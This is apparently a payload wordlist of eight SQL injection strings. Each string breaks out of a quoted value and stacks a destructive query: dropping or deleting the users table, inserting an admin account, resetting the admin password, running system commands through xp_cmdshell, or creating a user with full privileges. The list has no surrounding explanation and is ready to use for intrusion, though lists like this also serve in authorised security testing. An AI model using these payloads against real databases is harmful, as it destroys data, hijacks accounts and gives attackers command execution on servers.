1'; DROP TABLE users--
1'; DELETE FROM users--
1'; INSERT INTO users VALUES ('admin','password')--
1'; UPDATE users SET password='hacked' WHERE username='admin'--
1'; EXEC xp_cmdshell 'dir'--
1'; EXEC master..xp_cmdshell 'net user'--
1'; CREATE USER hacker IDENTIFIED BY 'password'--
1'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--
